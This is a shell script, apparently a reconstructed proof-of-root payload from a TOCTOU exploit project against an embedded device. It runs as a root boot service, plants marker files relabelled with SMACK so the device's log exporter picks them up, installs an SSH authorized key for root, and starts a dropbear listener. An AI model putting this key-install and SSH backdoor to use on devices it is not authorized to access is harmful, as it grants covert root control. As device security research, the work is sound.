#!/bin/sh
# v1 base-PoC benign proof-of-root. RECONSTRUCTED to match pizero/STATUS.md's documented 4-channel
# model + 01_make_evil_rootfs.sh install paths — the original was never committed. Review before
# publishing. Superseded by the v2 Owner Tools image. No destructive/covert/anti-forensic action:
# it only writes recognizable marker strings. Runs as the root oneshot wideopen.service at boot.
set +e
MARK="TOCTOU_PROOF $(id 2>/dev/null) | $(uname -a 2>/dev/null) | $(date -u 2>/dev/null)"

# T1 (deterministic) — drop a marker into the /log_data categories the diagnostic export copies,
# labeled Log::engineermode so the stock extractor (AppLogExtractor) captures it. Observe with
# `grep -r TOCTOU_PROOF` on a pulled export.
for d in log AppUpgrade audit dltlog; do
  mkdir -p "/log_data/$d" 2>/dev/null
  printf '%s\n' "$MARK" > "/log_data/$d/TOCTOU_PROOF.txt" 2>/dev/null
  chsmack -a Log::engineermode "/log_data/$d/TOCTOU_PROOF.txt" 2>/dev/null
done

# the classic marker path as well
printf '%s\n' "$MARK" > /var/log/TOCTOU_ROOT_PROOF 2>/dev/null

# T3 (live root, bench only) — install the owner key and, if a dropbear is present, start it on the
# dbg0 ethernet NIC. No-op if dropbear isn't bundled (the v1 payload does not ship one).
if [ -f /etc/wideopen_authorized_keys ]; then
  mkdir -p /root/.ssh 2>/dev/null && chmod 700 /root/.ssh 2>/dev/null
  cp /etc/wideopen_authorized_keys /root/.ssh/authorized_keys 2>/dev/null
  chmod 600 /root/.ssh/authorized_keys 2>/dev/null
fi
command -v dropbear >/dev/null 2>&1 && dropbear -p 192.168.1.100:2222 2>/dev/null

# T4 (lossy) — kmsg/ramoops marker, last resort.
printf '%s\n' "$MARK" > /dev/kmsg 2>/dev/null
exit 0
